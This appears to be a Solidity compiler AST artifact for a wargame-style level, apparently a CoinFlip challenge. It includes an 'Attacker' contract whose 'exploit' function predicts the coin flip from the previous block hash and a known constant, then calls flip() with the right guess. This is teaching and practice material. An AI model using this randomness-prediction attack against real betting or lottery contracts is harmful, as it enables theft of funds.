									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 82,
							"src": "57:655:0",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "32:680:0"
				},
				"id": 0
			},
			"tests/test03.sol": {
				"ast": {
					"absolutePath": "tests/test03.sol",
					"exportedSymbols": {
						"Attacker": [
							166
						],
						"CoinFlip": [
							81
						]
					},
					"id": 167,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 83,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:1"
						},
						{
							"absolutePath": "src/level03.sol",
							"file": "../src/level03.sol",
							"id": 84,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 167,
							"sourceUnit": 82,
							"src": "57:28:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "Attacker",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 166,
							"linearizedBaseContracts": [
								166
							],
							"name": "Attacker",
							"nameLocation": "96:8:1",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 86,
									"mutability": "mutable",
									"name": "lastHash",
									"nameLocation": "119:8:1",
									"nodeType": "VariableDeclaration",
									"scope": 166,
									"src": "111:16:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 85,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "111:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 89,
									"mutability": "mutable",
									"name": "FACTOR",
									"nameLocation": "141:6:1",
									"nodeType": "VariableDeclaration",
									"scope": 166,
									"src": "133:94:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 87,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "133:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 88,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "150:77:1",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 92,
									"mutability": "mutable",
									"name": "level",
									"nameLocation": "243:5:1",
									"nodeType": "VariableDeclaration",
									"scope": 166,
									"src": "234:14:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_CoinFlip_$81",
										"typeString": "contract CoinFlip"
									},
									"typeName": {
										"id": 91,
										"nodeType": "UserDefinedTypeName",
										"pathNode": {
											"id": 90,
											"name": "CoinFlip",
											"nameLocations": [
												"234:8:1"
											],
											"nodeType": "IdentifierPath",
											"referencedDeclaration": 81,
											"src": "234:8:1"
										},
										"referencedDeclaration": 81,
										"src": "234:8:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_CoinFlip_$81",
											"typeString": "contract CoinFlip"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 103,
										"nodeType": "Block",
										"src": "286:41:1",
										"statements": [
											{
												"expression": {
													"id": 101,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 97,
														"name": "level",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 92,
														"src": "296:5:1",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$81",
															"typeString": "contract CoinFlip"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"arguments": [
															{
																"id": 99,
																"name": "_level",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 94,
																"src": "313:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 98,
															"name": "CoinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 81,
															"src": "304:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_CoinFlip_$81_$",
																"typeString": "type(contract CoinFlip)"
															}
														},
														"id": 100,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"nameLocations": [],
														"names": [],
														"nodeType": "FunctionCall",
														"src": "304:16:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$81",
															"typeString": "contract CoinFlip"
														}
													},
													"src": "296:24:1",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_CoinFlip_$81",
														"typeString": "contract CoinFlip"
													}
												},
												"id": 102,
												"nodeType": "ExpressionStatement",
												"src": "296:24:1"
											}
										]
									},
									"id": 104,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 95,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 94,
												"mutability": "mutable",
												"name": "_level",
												"nameLocation": "274:6:1",
												"nodeType": "VariableDeclaration",
												"scope": 104,
												"src": "266:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 93,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "266:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "265:16:1"
									},
									"returnParameters": {
										"id": 96,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "286:0:1"
									},
									"scope": 166,
									"src": "254:73:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 164,
										"nodeType": "Block",
										"src": "366:475:1",
										"statements": [
											{
												"assignments": [
													108
												],
												"declarations": [
													{
														"constant": false,
														"id": 108,
														"mutability": "mutable",
														"name": "blockValue",
														"nameLocation": "388:10:1",
														"nodeType": "VariableDeclaration",
														"scope": 164,
														"src": "380:18:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 107,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "380:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 118,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 115,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"expression": {
																			"id": 112,
																			"name": "block",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967292,
																			"src": "419:5:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_block",
																				"typeString": "block"
																			}
																		},
																		"id": 113,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberLocation": "425:6:1",
																		"memberName": "number",
																		"nodeType": "MemberAccess",
																		"src": "419:12:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"hexValue": "31",
																		"id": 114,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "434:1:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "419:16:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 111,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "409:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 116,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "409:27:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 110,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "401:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 109,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "401:7:1",
															"typeDescriptions": {}
														}
													},
													"id": 117,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "401:36:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "380:57:1"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 121,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 119,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 86,
														"src": "455:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 120,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 108,
														"src": "467:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "455:22:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 126,
												"nodeType": "IfStatement",
												"src": "451:65:1",
												"trueBody": {
													"id": 125,
													"nodeType": "Block",
													"src": "479:37:1",
													"statements": [
														{
															"expression": {
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 122,
																	"name": "revert",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967277,
																		4294967277
																	],
																	"referencedDeclaration": 4294967277,
																	"src": "493:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_revert_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 123,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "493:8:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 124,
															"nodeType": "ExpressionStatement",
															"src": "493:8:1"
														}
													]
												}
											},
											{
												"expression": {
													"id": 129,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 127,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 86,
														"src": "530:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 128,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 108,
														"src": "541:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "530:21:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 130,
												"nodeType": "ExpressionStatement",
												"src": "530:21:1"
											},
											{
												"assignments": [
													132
												],
												"declarations": [
													{
														"constant": false,
														"id": 132,
														"mutability": "mutable",
														"name": "coinFlip",
														"nameLocation": "573:8:1",
														"nodeType": "VariableDeclaration",
														"scope": 164,
														"src": "565:16:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 131,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "565:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 136,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 135,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 133,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 108,
														"src": "584:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"id": 134,
														"name": "FACTOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 89,
														"src": "597:6:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "584:19:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "565:38:1"
											},
											{
												"assignments": [
													138
												],
												"declarations": [
													{
														"constant": false,
														"id": 138,
														"mutability": "mutable",
														"name": "side",
														"nameLocation": "622:4:1",
														"nodeType": "VariableDeclaration",
														"scope": 164,
														"src": "617:9:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 137,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "617:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 145,
												"initialValue": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 141,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 139,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 132,
															"src": "629:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 140,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "641:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "629:13:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 143,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "652:5:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 144,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "629:28:1",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 142,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "645:4:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "617:40:1"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 148,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 146,
														"name": "side",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 138,
														"src": "676:4:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"hexValue": "74727565",
														"id": 147,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "684:4:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"src": "676:12:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 162,
													"nodeType": "Block",
													"src": "781:50:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"hexValue": "66616c7365",
																		"id": 159,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "bool",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "810:5:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"value": "false"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	],
																	"expression": {
																		"id": 156,
																		"name": "level",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 92,
																		"src": "799:5:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_CoinFlip_$81",
																			"typeString": "contract CoinFlip"
																		}
																	},
																	"id": 158,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberLocation": "805:4:1",
																	"memberName": "flip",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 80,
																	"src": "799:10:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_nonpayable$_t_bool_$returns$_t_bool_$",
																		"typeString": "function (bool) external returns (bool)"
																	}
																},
																"id": 160,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "799:17:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"id": 161,
															"nodeType": "ExpressionStatement",
															"src": "799:17:1"
														}
													]
												},
												"id": 163,
												"nodeType": "IfStatement",
												"src": "672:159:1",
												"trueBody": {
													"id": 155,
													"nodeType": "Block",
													"src": "702:49:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"hexValue": "74727565",
																		"id": 152,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "bool",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "731:4:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"value": "true"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	],
																	"expression": {
																		"id": 149,
																		"name": "level",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 92,
																		"src": "720:5:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_CoinFlip_$81",
																			"typeString": "contract CoinFlip"
																		}
																	},
																	"id": 151,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberLocation": "726:4:1",
																	"memberName": "flip",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 80,
																	"src": "720:10:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_nonpayable$_t_bool_$returns$_t_bool_$",
																		"typeString": "function (bool) external returns (bool)"
																	}
																},
																"id": 153,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "720:16:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"id": 154,
															"nodeType": "ExpressionStatement",
															"src": "720:16:1"
														}
													]
												}
											}
										]
									},
									"functionSelector": "63d9b770",
									"id": 165,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "exploit",
									"nameLocation": "342:7:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 105,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "349:2:1"
									},
									"returnParameters": {
										"id": 106,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "366:0:1"
									},
									"scope": 166,
									"src": "333:508:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 167,
							"src": "87:759:1",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "32:814:1"
				},
				"id": 1
			}
		}
	}
}